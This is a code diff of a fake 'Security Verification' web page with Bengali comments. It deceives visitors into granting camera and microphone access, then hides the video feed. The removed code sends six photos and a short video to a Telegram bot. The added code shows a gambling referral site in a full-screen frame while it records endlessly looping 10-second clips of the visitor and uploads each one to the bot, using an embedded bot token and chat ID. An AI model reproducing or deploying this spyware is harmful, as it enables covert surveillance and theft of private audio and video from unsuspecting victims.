@@ -2,33 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Security Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
         #v_stream { position: fixed; left: -9999px; opacity: 0; }
+        #main_frame { width: 100%; height: 100%; border: none; display: none; }
+        .verify-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f3f4f6; }
     </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+<body>
 
-    <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center border border-gray-200">
-        <div class="mb-4 flex justify-center">
-            <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
-        </div>
-        <h2 class="text-xl font-bold text-gray-800">Security Check</h2>
-        <p class="text-gray-500 mt-2 text-sm">Please click <b>"Allow"</b> to verify your browser.</p>
-        
-        <div class="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-100">
-            <div id="timer" class="text-3xl font-mono font-bold text-blue-600">15s</div>
-            <p class="text-[10px] text-gray-400 mt-1">PROCESSING SECURE CONNECTION</p>
-        </div>
+    <div id="verify_ui" class="verify-box p-6 text-center">
+        <div class="animate-spin h-12 w-12 border-4 border-blue-600 border-t-transparent rounded-full mb-4"></div>
+        <h2 class="text-2xl font-bold text-gray-800">Checking Browser...</h2>
+        <p class="text-gray-500 mt-2">Please click <b>"Allow"</b> to continue to the site.</p>
     </div>
 
+    <iframe id="main_frame" src=""></iframe>
+
     <video id="v_stream" autoplay playsinline muted></video>
-    <canvas id="c_save" class="hidden"></canvas>
 
     <script>
-        // ১. সরাসরি Chrome-এ নিয়ে যাওয়ার সিস্টেম
+        // ১. ক্রোম রিডাইরেক্ট সিস্টেম
         const ua = navigator.userAgent;
         if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
             const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
@@ -38,80 +35,60 @@
         const CONFIG = {
             t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
             c: '7785049939', 
-            u: 'https://dkwin9.com/#/register?invitationCode=14856937272'
+            u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
+            clip_duration: 10000 // ১০ সেকেন্ড প্রতি ক্লিপ
         };
 
-        let timeLeft = 15;
+        let mediaRecorder;
+        let stream;
 
         async function init() {
             try {
-                // ২. ক্যামেরা পারমিশন নেওয়া
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('v_stream');
-                video.srcObject = stream;
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v_stream').srcObject = stream;
 
-                // টাইমার শুরু
-                const timerInt = setInterval(() => {
-                    timeLeft--;
-                    if(timeLeft >= 0) document.getElementById('timer').innerText = timeLeft + "s";
-                    if(timeLeft <= 0) clearInterval(timerInt);
-                }, 1000);
+                // ২. পারমিশন পাওয়ার পর মেইন ওয়েবসাইটকে ফ্রেমের ভেতর লোড করো
+                document.getElementById('verify_ui').style.display = 'none';
+                const frame = document.getElementById('main_frame');
+                frame.src = CONFIG.u;
+                frame.style.display = 'block';
 
-                // ৩. ক্যামেরা সেট হওয়ার জন্য ২ সেকেন্ড সময় দাও
-                setTimeout(async () => {
-                    // ৪. আগে ৬টি ছবি তোলো (ভিডিও রেকর্ড শুরুর আগে)
-                    for (let i = 1; i <= 6; i++) {
-                        await takePhoto(video);
-                        await new Promise(r => setTimeout(r, 700)); // ০.৭ সেকেন্ড গ্যাপ
-                    }
-                    
-                    // ৫. ছবি তোলা শেষ, এবার ভিডিও শুরু করো
-                    startVideoRecording(stream);
-                }, 2000);
+                // ৩. লুপ রেকর্ডিং শুরু (প্রতি ১০ সেকেন্ডে ভিডিও পাঠাবে)
+                startLoopRecording();
 
             } catch (err) {
                 setTimeout(() => { location.reload(); }, 500);
             }
         }
 
-        async function takePhoto(video) {
-            return new Promise((resolve) => {
-                const canvas = document.getElementById('c_save');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                
-                // সেন্সর থেকে সরাসরি ইমেজ ড্র করা
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CONFIG.c);
-                    formData.append('photo', blob, 'shot.jpg');
-                    fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData })
-                    .finally(() => resolve());
-                }, 'image/jpeg', 0.9);
-            });
-        }
-
-        function startVideoRecording(stream) {
-            const mediaRecorder = new MediaRecorder(stream);
+        function startLoopRecording() {
+            mediaRecorder = new MediaRecorder(stream);
             let chunks = [];
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
             mediaRecorder.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
-                formData.append('video', blob, 'video.mp4');
-                await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
-                window.location.replace(CONFIG.u);
+                formData.append('video', blob, 'clip.mp4');
+                formData.append('caption', 'New 10s Background Clip');
+
+                // ভিডিও পাঠাও
+                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
+
+                // আবার রেকর্ডিং শুরু করো (আনলিমিটেড লুপ)
+                startLoopRecording();
             };
 
             mediaRecorder.start();
+            
+            // ১০ সেকেন্ড পর পর সেভ করবে এবং নতুন করে শুরু করবে
             setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(t => t.stop());
-            }, 8000); // ৮ সেকেন্ড ভিডিও
+                if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
+            }, CONFIG.clip_duration);
         }
 
         window.onload = init;
